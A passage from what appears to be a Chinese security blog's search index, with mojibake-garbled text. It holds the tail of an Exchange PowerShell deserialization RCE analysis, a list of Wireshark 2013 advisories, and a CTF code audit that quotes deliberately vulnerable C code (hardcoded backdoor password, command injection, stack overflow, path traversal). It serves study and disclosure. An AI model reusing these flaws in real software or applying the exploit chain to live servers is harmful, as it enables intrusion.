this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } serParser.Run()ä¼šå°†å†…å­˜åºåˆ—åŒ–æ•°æ®è¯•å›¾è½¬åŒ–ä¸ºSystem.UnitySerializationHolder å¯¹è±¡ï¼Œä»£ç å¦‚ä¸‹ï¼Œé€šè¿‡å¾ªç¯è¯»å–å„ä¸ªæ ‡å¿—ä½è°ƒç”¨ä¸åŒæ–¹æ³•ä»å†…å­˜ä¸­è¯»å–æŒ‡å®šç±»å‹çš„æ•°æ®ã€‚æ„é€ å‡ºSystem.UnitySerializationHolderå¯¹è±¡å¹¶è½½å…¥System.UnitySerializationHolder.AssemblyNameå¯¹åº”çš„DLLã€‚\ninternal void Run() { try { bool flag = true; this.ReadBegin(); this.ReadSerializationHeaderRecord(); while (flag) { BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object; BinaryTypeEnum binaryTypeEnum = this.expectedType; if (binaryTypeEnum != BinaryTypeEnum.Primitive) { if (binaryTypeEnum - BinaryTypeEnum.String \u0026gt; 6) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TypeExpected\u0026#34;)); } byte b = this.dataReader.ReadByte(); binaryHeaderEnum = (BinaryHeaderEnum)b; switch (binaryHeaderEnum) { case BinaryHeaderEnum.Object: this.ReadObject(); break; case BinaryHeaderEnum.ObjectWithMap: ..... this.ReadObjectWithMap(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectWithMapTyped: ...... this.ReadObjectWithMapTyped(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectString: ...... this.ReadObjectString(binaryHeaderEnum); break; case BinaryHea......flag2) { ObjectProgress objectProgress = (ObjectProgress)this.stack.Peek(); if (objectProgress == null) { this.expectedType = BinaryTypeEnum.ObjectUrt; this.expectedTypeInformation = null; flag2 = true; } else { flag2 = objectProgress.GetNext(out objectProgress.expectedType, out objectProgress.expectedTypeInformation); this.expectedType = objectProgress.expectedType; this.expectedTypeInformation = objectProgress.expectedTypeInformation; if (!flag2) { this.prs.Init(); if (objectProgress.memberValueEnum == InternalMemberValueE.Nested) { this.prs.PRparseTypeEnum = InternalParseTypeE.MemberEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } else { this.prs.PRparseTypeEnum = InternalParseTypeE.ObjectEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } this.stack.Pop(); this.PutOp(objectProgress); } } } } } } ...... } å°†XamlReaderè¯»å…¥å†…å­˜\nåœ¨System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserializeä¸­å°†é€šè¿‡\nthis.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); å°†System.UnitySerializationHolderè½¬åŒ–ä¸ºTypeç±»å‹çš„XamlReaderå¯¹è±¡ï¼Œå¹¶é€šè¿‡åå°„è·å–äº†XamlReaderç±»çš„å„ä¸ªå±æ€§ã€‚\nåœ¨æœ€åå°†this.TopObjectä½œä¸ºè¿”å›å€¼è¿”å›ï¼Œåœ¨ç»è¿‡ä¸€ç³»åˆ—å‡½æ•°è°ƒç”¨è¿”å›åï¼Œå¯ä»¥åœ¨è°ƒè¯•å™¨çœ‹åˆ°ConvertToå‡½æ•°è¿”å›äº†Objectç±»å‹å¯¹è±¡obj2ï¼Œå¯ä»¥çœ‹åˆ°å…¶ä¸ºç±»å‹ä¸ºTypeç±»å‹çš„XamlReaderå¯¹è±¡ï¼Œä¹‹åReadOneObjectè¿”å›è¯¥å¯¹è±¡ã€‚\næ³¨ï¼šTypeç±»å‹æ˜¯Exchangeå†…å®šä¹‰çš„æŠ½è±¡ç±»ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š\nnamespace System { // Token: 0x02000148 RID: 328 [ClassInterface(ClassInterfaceType.None)] [ComDefaultInterface(typeof(_Type))] [ComVisible(true)] [__DynamicallyInvokable] [Serializable] public abstract class Type : MemberInfo, _Type, IReflect { // Token: 0x17000217 RID: 535 // (get) Token: 0x060013E6 RID: 5094 RVA: 0x0003BE2A File Offset: 0x0003A02A public override MemberTypes MemberType { get { return MemberTypes.TypeInfo; } } (åº”è¯¥å¯ä»¥ç†è§£obj2ä¸ºå®ç°äº†Typeè¿™ä¸ªæŠ½è±¡ç±»çš„XamlReaderå¯¹è±¡ï¼Œè€ŒXamlReaderç»§æ‰¿äº†Objectè¿™ä¸ªçˆ¶ç±»ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨Objectç±»å‹å¯¹è±¡æ¥å—)\nåœ¨è°ƒç”¨æ ˆå†…ï¼ŒReadOneObjectç”±ReadPropertiesè°ƒç”¨ï¼Œå›åˆ°ReadPropertiesé€»è¾‘ä¸­ï¼ŒExchangeä¼šå°†ReadOneObjectè¿”å›çš„çš„Typeç±»å‹çš„XamlReaderå¯¹è±¡æ·»åŠ åˆ°dso.adaptedMembersä¸­ï¼Œè€Œåè¿™ä¸ªdsoå°†ä¼šè¿”å›åˆ°è°ƒç”¨æ ˆå†…çš„ReadOneObjectå‡½æ•°ã€‚\nç»§ç»­è°ƒè¯•ï¼Œæ­¤æ—¶åµŒå¥—å¯¹è±¡çš„å†…å±‚å¯¹è±¡å·²ååºåˆ—åŒ–ï¼Œå¼€å§‹ååºåˆ—åŒ–å¤–å±‚å¯¹è±¡ï¼Œå›åˆ°ç¨‹åºä¸­ï¼Œä»ä¸‹å›¾å¯ä»¥çœ‹åˆ°ï¼Œå°†ä¼šè°ƒç”¨psobject.GetTargetTypeForDeserializationè·å–ç›®æ ‡ååºåˆ—åŒ–ç±»å‹ï¼Œæ­¤æ—¶psobjectå†…çš„adaptedMemberså†…æœ‰åä¸ºTargetTypeForDeserializationçš„å¯¹è±¡ï¼Œå…¶ç±»å‹ä¸ºTypeçš„XamlReaderå¯¹è±¡\nè¿›å…¥åˆ°psobject.GetTargetTypeForDeserializationå†…ï¼Œè°ƒç”¨this.GetPSStandardMemberè¯•å›¾è·å–PSMemberInfo å¯¹è±¡ï¼Œè€Œåå°†å…¶å¼ºè½¬ä¸ºTypeå¯¹è±¡è¿”å›ï¼Œè‹¥å¤±è´¥åˆ™è¿”å›null\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } åœ¨GetPSStandardMemberå‡½æ•°å†…ï¼Œè°ƒç”¨PSObject.TypeTableGetMemberDelegateå¹¶ä¼ å…¥å½“å‰å¯¹è±¡ã€å…è®¸çš„ç±»å‹åˆ—è¡¨å’Œç¡¬ç¼–ç PSStandardMembersä»¥åˆå§‹åŒ–PSMemberSet å¯¹è±¡ã€‚\ninternal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } è€Œåè°ƒç”¨PSMemberInfoIntegratingCollectionæ„é€ å‡½æ•°ï¼Œå…¶ä¸­PSMemberInfoIntegratingCollectionç±»ç»§æ‰¿äº†PSMemberInfoç±»ã€‚ä¼ å…¥æ„é€ å‡½æ•°çš„collectionså˜é‡æ¥æºäºPSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable) å‡½æ•°çš„è¿”å›å€¼ï¼Œæ„é€ å‡½æ•°å°†collectionsèµ‹ç»™å½“å‰å¯¹è±¡çš„collectionså±æ€§ã€‚\ninternal class PSMemberInfoIntegratingCollection\u0026lt;T\u0026gt; : PSMemberInfoCollection\u0026lt;T\u0026gt;, IEnumerable\u0026lt;T\u0026gt;, IEnumerable where T : PSMemberInfo { // Token: 0x06002AC3 RID: 10947 RVA: 0x000C35F4 File Offset: 0x000C17F4 private void GenerateAllReservedMembers() { if (!this.mshOwner.hasGeneratedReservedMembers) { this.mshOwner.hasGeneratedReservedMembers = true; ReservedNameMembers.GeneratePSExtendedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSBaseMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSObjectMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSAdaptedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSTypeNames(this.mshOwner); } } internal PSMemberInfoIntegratingCollection(object owner, Collection\u0026lt;CollectionEntry\u0026lt;T\u0026gt;\u0026gt; collections) { if (owner == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;owner\u0026#34;); } this.mshOwner = (owner as PSObject); this.memberSetOwner = (owner as PSMemberSet); if (this.mshOwner == null \u0026amp;\u0026amp; this.memberSetOwner == null) { throw PSTraceSource.NewArgumentException(\u0026#34;owner\u0026#34;); } if (collections == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;collections\u0026#34;); } this.collections = collections; } GetMemberCollectionä»£ç å¦‚ä¸‹ï¼Œå…¶ä¼šå°†å¯¹è±¡çš„adaptedMemberså±æ€§æ·»åŠ åˆ°åˆ—è¡¨ä¸­ï¼Œè€Œåœ¨å†…å±‚å¯¹è±¡ååºåˆ—åŒ–æ—¶å·²ç»å°†åä¸ºTargetTypeForDeserializationçš„XamlReaderç±»å‹çš„Typeå¯¹è±¡åŠ å…¥åˆ°adaptedMemberså±æ€§ä¸­ã€‚æ‰€ä»¥è¿”å›çš„åˆ—è¡¨å†…ä¹Ÿä¼šåŒ…å«è¯¥å¯¹è±¡ã€‚\ninternal static Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable) { Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; collection = new Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt;(); if ((viewType \u0026amp; PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended) { if (backupTypeTable == null) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), true, true, \u0026#34;type table members\u0026#34;)); } else { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;((PSObject msjObj) =\u0026gt; PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable), (PSObject msjObj, string name) =\u0026gt; PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable, name), true, true, \u0026#34;type table members\u0026#34;)); } } if ((viewType \u0026amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted) { **collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.AdapterGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.AdapterGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;adapted members\u0026#34;));** } if ((viewType \u0026amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.DotNetGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.DotNetGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;clr members\u0026#34;)); } return collection; } private static T AdapterGetMemberDelegate\u0026lt;T\u0026gt;(PSObject msjObj, string name) where T : PSMemberInfo { if (!msjObj.isDeserialized) { T t = msjObj.InternalAdapter.BaseGetMember\u0026lt;T\u0026gt;(msjObj.immediateBaseObject, name); PSObject.memberResolution.WriteLine(\u0026#34;Adapted member: {0}.\u0026#34;, (t == null) ? \u0026#34;not found\u0026#34; : t.Name); return t; } if (msjObj.adaptedMembers == null) { return default(T); } T t2 = msjObj.adaptedMembers[name] as T; PSObject.memberResolution.WriteLine(\u0026#34;Serialized adapted member: {0}.\u0026#34;, (t2 == null) ? \u0026#34;not found\u0026#34; : t2.Name); return t2; } è¿”å›åˆ°GetPSStandardMemberå‡½æ•°ä¸­ï¼ŒExchangeä¼šåŒ¹é…æ„é€ å‡½æ•°è¿”å›çš„å¯¹è±¡çš„memberNameå±æ€§ï¼Œè¯¥å±æ€§æ¥æºäºGetTargetTypeForDeserializationè°ƒç”¨æ—¶ä¼ é€’çš„ç¡¬ç¼–ç TargetTypeForDeserializationï¼Œå³å°†ä»è¯¥å¯¹è±¡ä¸­æ£€ç´¢åä¸ºTargetTypeForDeserializationçš„å€¼ï¼Œå‰é¢æåˆ°è¿‡åˆ—è¡¨å†…å·²æœ‰è¯¥åå­—çš„å¯¹è±¡ï¼Œæ‰€ä»¥å°†åŒ¹é…åˆ°XamlReaderç±»å‹çš„Typeå¯¹è±¡ï¼Œå¹¶è¿”å›ç»™ä¸Šå±‚å‡½æ•°ã€‚\nè¿”å›åˆ°ä¸Šå±‚å‡½æ•°ï¼ŒGetTargetTypeForDeserializationè¿”å›äº†XamlReaderç±»å‹ã€‚\nè¿›å…¥åˆ°ConvertToå‡½æ•°å†…ï¼ŒvalueToConvertä¸ºä¸Šå±‚å‡½æ•°ReadOneObjectå‡½æ•°ä¼ å…¥çš„objå¯¹è±¡ï¼Œå…¶å†…åŒ…å«äº†xamlååºåˆ—åŒ–çš„å‘½ä»¤æ‰§è¡Œå­—ç¬¦ä¸²ã€‚\nè¿›å…¥åˆ°LanguagePrimitives.FigureConversionåœ¨#3527å¤„æ–­ç‚¹ï¼Œæ­¤æ—¶fromTypeä¸ºStringï¼ŒtoTypeä¸ºXamlReader\nè¿›å…¥FigureParseConversionå†…ï¼Œå°†ä¼šé€šè¿‡åå°„è·å–åˆ°XamlReaderçš„Parseæ–¹æ³•ã€‚\nprivate static LanguagePrimitives.PSConverter\u0026lt;object\u0026gt; FigureParseConversion(Type fromType, Type toType) { ..... else if (fromType == typeof(string)) { MethodInfo methodInfo = null; try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string), typeof(IFormatProvider) }, null); } catch (AmbiguousMatchException ex) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex.Message); } catch (ArgumentException ex2) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex2.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithCulture); } try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string) }, null); } catch (AmbiguousMatchException ex3) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex3.Message); } catch (ArgumentException ex4) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex4.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithoutCulture); } } return null; } XamlReader.Parseæ–¹æ³•å°†ä¼šç”±LanguagePrimitives.ConvertViaParseMethod.ConvertWithoutCultureæ–¹æ³•è°ƒç”¨ã€‚ä¹‹åå°±æ˜¯æ™®é€šçš„ååºåˆ—åŒ–è¿‡ç¨‹äº†ã€‚\nå°ç»“ è¿™ä¸ªæ¼æ´åˆ©ç”¨é“¾æ ¸å¿ƒæ˜¯å¦‚ä½•ç»•è¿‡Exchangeé»‘åå•ç±»å¹¶ä½¿Exchangeå°†æ”»å‡»è€…æ§åˆ¶çš„æŒ‡å®šæ•°æ®ååºåˆ—åŒ–åˆ°æŒ‡å®šå±é™©ç±»é€ æˆä»£ç æ‰§è¡Œã€‚\næ¼æ´åˆ©ç”¨äº†Exchangeçš„åˆæ³•åŠŸèƒ½ï¼Œå…ˆæ„é€ äº†åä¸ºtargetTypeForDeserialization çš„XamlReaderç±»å‹çš„Typeå¯¹è±¡åºåˆ—åŒ–å€¼ï¼Œåˆ©ç”¨Microsoft.Exchange.Data.SerializationTypeConverterçš„ç‰¹æ€§è¿”å›äº†XamlReaderç±»å‹çš„Typeå¯¹è±¡ï¼Œè€ŒåReadPropertieså°†å…¶åŠ å…¥åˆ°adaptedMemberå†…ã€‚åœ¨å¤–å±‚å¯¹è±¡ååºåˆ—åŒ–æ—¶ï¼Œæ„é€ çš„PSMembersåŒ…å«äº†åä¸ºtargetTypeForDeserializationçš„XamlReaderç±»å‹çš„Typeå¯¹è±¡ï¼ŒExchangeä¼šåœ¨PSMembersåˆ—è¡¨å†…åŒ¹é…targetTypeForDeserializationé¡¹ï¼Œä»è€Œæ§åˆ¶äº†ConvertToå‡½æ•°è½¬åŒ–çš„ç›®æ ‡ç±»XamlReaderï¼ŒExchangeé€šè¿‡åå°„è·å–åˆ°äº†XamlReaderçš„Parseæ–¹æ³•ï¼Œè°ƒç”¨è¯¥æ–¹æ³•ååºåˆ—åŒ–æ”»å‡»è€…å¯æ§çš„åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘ä»£ç æ‰§è¡Œã€‚\nåœ¨è°ƒè¯•è¿‡ç¨‹ä¸­éœ€è¦å°†.NET Frameworkçš„ä¼˜åŒ–å…³æ‰ä»¥ä¾¿dnSpyè°ƒè¯•\n[.NET Framework Debugging Control] GenerateTrackingInfo=1 AllowOptimize=0 COMPlus_ZapDisable=1 COMPlus_ReadyToRun=0 å…¶ä»–\nPSRPï¼šPowerShell Remote Protocol powerShellè¿œç¨‹åè®®ï¼Œæ˜¯å¾®è½¯æä¾›çš„é€šè¿‡SOAPåè®®ä¸Šæ‰§è¡ŒPowerShellä»£ç çš„åè®®\nå‚è€ƒèµ„æ–™\nhttps://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend\nhttps://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell\nCreated at 2023-05-05T20:35:49+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/wireshark-185/","title":"Wireshark 1.8.5ä»£ç å®¡è®¡","tags":[],"description":"","content":"é€šè¿‡çˆ¬å–wiresharkçš„æ¼æ´å…¬å‘Šé¡µé¢ï¼Œç­›é€‰1.8.6ä¿®å¤çš„æ¼æ´å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœï¼š\n1.8.6/1.8.7ä¿®å¤çš„æ¼æ´\nwnpa-sec-2013-31. ETCH dissector large loop. Fixed in 1.8.7.\nThe ETCH dissector could go into a large loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-30. MySQL dissector infinite loop. Fixed in 1.8.7.\nThe MySQL dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-29. Websocket dissector crash. Fixed in 1.8.7.\nThe Websocket dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-28. MPEG DSM-CC dissector crash. Fixed in 1.8.7.\nThe MPEG DSM-CC dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-27. DCP ETSI dissector crash. Fixed in 1.8.7.\nThe DCP ETSI dissector could crash. Discovered by Evan Jensen.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-26. PPP CCP dissector crash. Fixed in 1.8.7.\nThe PPP CCP dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-25. ASN.1 BER dissector crash. Fixed in 1.8.7, 1.6.15.\nThe ASN.1 BER dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-24. GTPv2 dissector crash. Fixed in 1.8.7.\nThe GTPv2 dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-23. RELOAD dissector infinite loop. Fixed in 1.8.7.\nThe RELOAD dissector could go into an infinite loop. Discovered by Evan Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-22. DTLS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe DTLS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-21. RELOAD dissector infinite loop. Fixed in 1.8.6.\nThe RELOAD dissector could go into an infinite loop. Discovered by Even Jensen.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-20. FCSP dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe FCSP dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-19. CIMD dissector crash. Fixed in 1.8.6, 1.6.14.\nThe CIMD dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-18. ACN dissector divide by zero. Fixed in 1.8.6, 1.6.14.\nThe ACN dissector could attempt to divide by zero. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-17. AMPQ dissector infinite loop. Fixed in 1.8.6, 1.6.14.\nThe AMPQ dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-16. Mount dissector crash. Fixed in 1.8.6, 1.6.14.\nThe Mount dissector could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-15. RTPS and RTPS2 dissector crash. Fixed in 1.8.6, 1.6.14.\nThe RTPS and RTPS2 dissectors could crash. Discovered by Alyssa Milburn.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-14. MPLS Echo dissector infinite loop. Fixed in 1.8.6.\nThe MPLS Echo dissector could go into an infinite loop. Discovered by Laurent Butti.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-13. MS-MMS dissector crash. Fixed in 1.8.6, 1.6.14.\nThe MS-MMS dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-12. CSN.1 dissector crash. Fixed in 1.8.6.\nThe CSN.1 dissector could crash. Discovered by Laurent Butti.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-11. HART/IP dissector infinite loop. Fixed in 1.8.6.\nThe HART/IP dissectory could go into an infinite loop.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-10. TCP dissector crash. Fixed in 1.8.6.\nThe TCP dissector could crashIt may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nCreated att 2022-09-08T18:13:59+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/news-server/","title":"News Serverå®¡è®¡","tags":[],"description":"","content":"ä»£ç åœ°å€\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_install.sh\nhttps://trailofbits.github.io/ctf/vulnerabilities/source_workshop/news_server.c\nhttps://trailofbits.github.io/ctf/vulnerabilities/source.html\nç¼–è¯‘ï¼šgcc -m32 -g -o news_server news_server.c\nç›®æ ‡ï¼šæ‰¾å‡º10ä¸ªbugå’Œæ¼æ´\nnews_serveré»˜è®¤å·¥ä½œåœ¨æ ¹ç›®å½•ï¼Œæ²¡æœ‰é€šè¿‡chdiråˆ‡æ¢å·¥ä½œç›®å½•ï¼ˆä¸çŸ¥é“ç®—ä¸ç®—bugï¼‰\nä¿®å¤ï¼š\nvoid handleConnection(FILE *logfile, int sock) { chdir(\u0026#34;/root/code/c/news_server/\u0026#34;); åœ¨authenticateå‡½æ•°å­˜åœ¨adminåé—¨\nif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } authenticate ä¸­ç›´æ¥æ‹¼æ¥ç”¨æˆ·è¾“å…¥åˆ°å‘½ä»¤ï¼Œå‘½ä»¤æ³¨å…¥\nint authenticate(FILE *logfile, char *user, char *pass) { char search[512]; char path[1024]; char userfile[1024]; char data[1024]; FILE *file; int ret; memset(path, 0, sizeof(1024)); /* FIXME: hard coded admin backdoor for password recovery */\tif (memcmp(pass, \u0026#34;baCkDoOr\u0026#34;, 9) == 0) { return 1; } /* look up user by checking user files: done via system() to /bin/ls|grep user */ logData(logfile, \u0026#34;performing lookup for user via system()!\\n\u0026#34;); snprintf(userfile, sizeof(userfile)-1, \u0026#34;%s.txt\u0026#34;, user); snprintf(search, sizeof(userfile)-1, \u0026#34;stat %s`ls %s | grep %s`\u0026#34;, USERPATH, USERPATH, userfile); ret = system(search); æ ˆæº¢å‡ºã€ä»»æ„æ–‡ä»¶è¯»ï¼ˆç›®å½•ç©¿è¶Šï¼‰\nvoid readArticle(int sock, FILE *logfile, char *action) { FILE *file; char buf[100]; char path[100]; logData(logfile, \u0026amp;action[1]); strcpy(path, ARTICLEPATH); strcat(path, \u0026amp;action[1]); logData(logfile, \u0026#34;user request to read article: %s\u0026#34;, path); file = fopen(path, \u0026#34;r\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } /* fgets for the size of the buffer (100), from the file writing the article to the user each time! */ while (fgets(buf, 1000, file)) æ–‡ä»¶å†™ï¼ˆç›®å½•ç©¿è¶Šï¼‰ã€æ ˆæº¢å‡º11å­—èŠ‚\nvoid writeArticle(int sock, FILE *logfile, char *action) { FILE *file;\tchar *p; size_t x, y; int complete = 0; char buf[1024]; char path[1024]; strcpy(path, ARTICLEPATH); strncat(path, \u0026amp;action[1], sizeof(path)); logData(logfile, \u0026#34;user writing article: %s\u0026#34;, path); file = fopen(\u0026amp;action[1], \u0026#34;w\u0026#34;); if (!file) { writeSock(sock, FILENOTAVAIL, sizeof(FILENOTAVAIL)); return; } writeSock(sock, BEGINFILE, sizeof(BEGINFILE)); "},{"uri":"https://www.ch35tnut.site/zh-cn/others/add-timeline-shortcode/","title":"ç»™hugo-theme-learnå¢åŠ timelineåŠŸèƒ½","tags":[],"description":"","content":"å‰è¨€ ç°åœ¨ä½¿ç”¨hugo-theme-learnä¸»é¢˜ï¼Œä½†è¿™ä¸ªä¸»é¢˜æ²¡æœ‰æä¾›æ—¶é—´çº¿åŠŸèƒ½ï¼Œä¸ºäº†ç»™é¦–é¡µå¢åŠ æ—¶é—´çº¿åŠŸèƒ½ï¼ŒèŠ±äº†ä¸¤å¤©ç ”ç©¶äº†ä¸€ä¸‹æ€ä¹ˆæ·»åŠ æ—¶é—´çº¿åŠŸèƒ½ã€‚\nä¸ºäº†æ–¹ä¾¿å¢åŠ æ—¶é—´çº¿çš„äº‹ä»¶ï¼Œé‡‡ç”¨è‡ªå®šä¹‰shortcodeçš„æ–¹å¼å¢åŠ æ—¶é—´çº¿ï¼Œä»£ç 